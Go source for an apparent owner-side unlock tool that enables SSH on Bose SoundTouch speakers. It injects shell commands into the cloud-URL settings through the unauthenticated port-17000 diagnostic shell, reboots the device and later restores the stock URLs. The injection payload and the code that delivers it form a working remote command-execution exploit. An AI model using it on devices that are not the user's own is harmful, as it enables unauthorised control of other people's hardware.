// Stick-free SSH unlock over the Bose :17000 TAP diagnostic shell.
//
// The stock firmware exposes a telnet-style command shell on TCP 17000 that
// accepts `envswitch boseurls set "<marge>" "<swupdate>"` and
// `sys configuration <key> "<value>"`. Writing a shell payload into the cloud
// URLs makes the firmware run it the next time it re-parses those URLs (a
// marge/boseurls check, or a boot): the payload touches the remote_services
// marker sshd gates on and starts sshd. Once :22 is open, RepairInstallViaSSH
// pushes STR over SSH with no USB stick at all - so a SoundTouch 300, Portable
// or SA-4 (none of which reliably read the stick at boot) can be converted
// without a stick or an adapter.
//
// Credit: the technique is from the gesellix/Bose-SoundTouch community
// (issues #471, #515, #519). This is an independent Go port for STR.
//
// Reliability, from live testing on ST300 (ginger) and Portable (taigan) plus
// the community reports: the payload only fires when the box actually does a
// marge/boseurls check. A box that still carries a Bose margeAccountUUID (it was
// used with the Bose app before the cloud shut down) checks roughly every 60 s
// and opens SSH quickly. A fully factory-reset box never checks on its own, so
// the injection is written but never runs - there the USB stick stays the
// reliable path. STR sends `sys reboot` over :17000 to trigger the boot-time
// re-parse without the user touching the speaker, which covers the models that
// fire on reboot (ST10/20/30, SA-4, CineMate). This is therefore an ADDITIVE
// stick-free path with the stick as the documented fallback, not a hard
// replacement.

package main

import (
	"fmt"
	"net"
	"strings"
	"time"
)

// remoteServicesInjection is appended to the marge URL. When the firmware next
// shells out that URL it runs these commands: touch the remote_services marker
// sshd checks for, then start sshd. The whole value is double-quoted in the
// telnet command because it contains spaces and semicolons.
const remoteServicesInjection = ";touch /tmp/remote_services;/etc/init.d/sshd start"

// telnetEnableBase is the placeholder cloud host used while unlocking SSH. A
// reserved .invalid name (RFC 6761) fails DNS instantly, so the injected
// `<tool> <base>` fails fast and the `;touch;sshd` payload runs without waiting
// on a network timeout. resetBoseURLsViaTelnet restores the real hosts after.
const telnetEnableBase = "https://str-setup.invalid"

// stockBoseURLs are the factory cloud URLs restored after a stick-free unlock,
// so no command injection lingers in the box config and STR's marge interception
// (which catches streaming.bose.com) works normally. Values read live from a
// stock SoundTouch 300 and Portable on FW 27.0.6.
var stockBoseURLs = struct{ marge, stats, swUpdate, bmx string }{
	marge:    "https://streaming.bose.com",
	stats:    "https://events.api.bosecm.com",
	swUpdate: "https://worldwide.bose.com/updates/soundtouch",
	bmx:      "https://content.api.bose.io/bmx/registry/v1/services",
}

// buildEnableSSHCommands returns the ordered :17000 command list that writes the
// enable-SSH injection. It writes BOTH the envswitch persistence layer (used by
// rhino/sm2 boxes, where it reflects in /info margeURL) AND all four
// `sys configuration` runtime keys (used by ginger/taigan, where envswitch does
// not reflect in getpdo/`/info` but sys configuration does) - the #519
// full-config superset, so one sequence covers every variant. Pure and
// hardware-free so it can be unit-tested.
func buildEnableSSHCommands(base string) []string {
	inj := base + remoteServicesInjection
	swu := base + "/updates/soundtouch"
	return []string{
		`sys configuration bmxRegistryUrl "` + base + `/bmx/registry/v1/services"`,
		`sys configuration statsServerUrl "` + base + `"`,
		`sys configuration margeServerUrl "` + inj + `"`,
		`sys configuration swUpdateUrl "` + swu + `"`,
		`envswitch boseurls set "` + inj + `" "` + swu + `"`,
	}
}

// buildResetBoseURLCommands returns the :17000 command list that restores stock
// cloud URLs (removing the injection).
func buildResetBoseURLCommands() []string {
	return []string{
		`sys configuration margeServerUrl "` + stockBoseURLs.marge + `"`,
		`sys configuration statsServerUrl "` + stockBoseURLs.stats + `"`,
		`sys configuration swUpdateUrl "` + stockBoseURLs.swUpdate + `"`,
		`sys configuration bmxRegistryUrl "` + stockBoseURLs.bmx + `"`,
		`envswitch boseurls set "` + stockBoseURLs.marge + `" "` + stockBoseURLs.swUpdate + `"`,
	}
}

// tapConn is a thin client for the Bose :17000 TAP command shell.
type tapConn struct {
	conn net.Conn
}

// dialTAP connects to :17000 and drains the initial "->" banner.
func dialTAP(host string, timeout time.Duration) (*tapConn, error) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, "17000"), timeout)
	if err != nil {
		return nil, err
	}
	t := &tapConn{conn: conn}
	t.drain(1500 * time.Millisecond)
	return t, nil
}

// drain reads until an idle gap after a "->"-terminated reply, or maxWindow
// elapses. The TAP shell echoes the command, an optional result, then "->".
func (t *tapConn) drain(maxWindow time.Duration) string {
	var sb strings.Builder
	buf := make([]byte, 4096)
	deadline := time.Now().Add(maxWindow)
	for time.Now().Before(deadline) {
		_ = t.conn.SetReadDeadline(time.Now().Add(400 * time.Millisecond))
		n, err := t.conn.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
		}
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				if sb.Len() > 0 && strings.HasSuffix(strings.TrimSpace(sb.String()), "->") {
					break
				}
				continue
			}
			break
		}
	}
	return sb.String()
}

// send writes a command and returns the drained reply.
func (t *tapConn) send(cmd string) (string, error) {
	if _, err := t.conn.Write([]byte(cmd + "\r\n")); err != nil {
		return "", err
	}
	return t.drain(2500 * time.Millisecond), nil
}

func (t *tapConn) close() { _ = t.conn.Close() }

// enableSSHViaTelnet writes the enable-SSH injection over :17000, reboots the
// box to trigger it, and polls :22 up to a model-aware budget. Returns whether
// SSH came up and a redaction-free command log for diagnostics.
func (a *App) enableSSHViaTelnet(host, model string) (bool, string) {
	var log strings.Builder
	t, err := dialTAP(host, 5*time.Second)
	if err != nil {
		a.logger.Info("telnet-enable: :17000 not reachable, cannot unlock SSH stick-free", "host", host, "err", err)
		return false, "port 17000 not reachable: " + err.Error()
	}
	for _, cmd := range buildEnableSSHCommands(telnetEnableBase) {
		reply, serr := t.send(cmd)
		fmt.Fprintf(&log, "-> %s\n%s\n", cmd, strings.TrimSpace(reply))
		if serr != nil {
			t.close()
			a.logger.Warn("telnet-enable: command transport failed", "host", host, "cmd", cmd, "err", serr)
			return false, log.String()
		}
		// A firmware variant may not expose every key; that is fine - the others
		// still land (best-effort, fallback-first). Only a transport error aborts.
		if strings.Contains(reply, "Command not found") || strings.Contains(reply, "Invalid Command") {
			a.logger.Info("telnet-enable: box rejected a config key (continuing with the rest)", "host", host, "cmd", cmd)
		}
	}
	if v, _ := t.send("getpdo CurrentSystemConfiguration"); strings.TrimSpace(v) != "" {
		fmt.Fprintf(&log, "-> getpdo CurrentSystemConfiguration\n%s\n", strings.TrimSpace(v))
	}
	// Reboot to trigger the boot-time URL re-parse without the user touching the
	// speaker. This is STR's advantage over the manual CLI flow.
	_, _ = t.send("sys reboot")
	t.close()
	a.logger.Info("telnet-enable: injection written and sys reboot sent; polling for SSH", "host", host, "model", model)

	budget := agentWaitBudget(model)
	deadline := time.Now().Add(budget)
	for time.Now().Before(deadline) {
		if tcpReachable(host, 22, 2*time.Second) {
			a.logger.Info("telnet-enable: SSH opened stick-free via :17000 unlock", "host", host)
			return true, log.String()
		}
		time.Sleep(4 * time.Second)
	}
	a.logger.Info("telnet-enable: SSH did not open within budget (box may need a physical power cycle, or is factory-reset and never checks marge)", "host", host, "budget", budget.String())
	return false, log.String()
}

// resetBoseURLsViaTelnet restores stock cloud URLs over :17000 after SSH has
// been unlocked, removing the command injection. Best-effort: run while :17000
// is still the plain Bose TAP, before STR's install changes the box's posture.
func (a *App) resetBoseURLsViaTelnet(host string) error {
	t, err := dialTAP(host, 5*time.Second)
	if err != nil {
		return err
	}
	defer t.close()
	for _, cmd := range buildResetBoseURLCommands() {
		if _, serr := t.send(cmd); serr != nil {
			return serr
		}
	}
	return nil
}
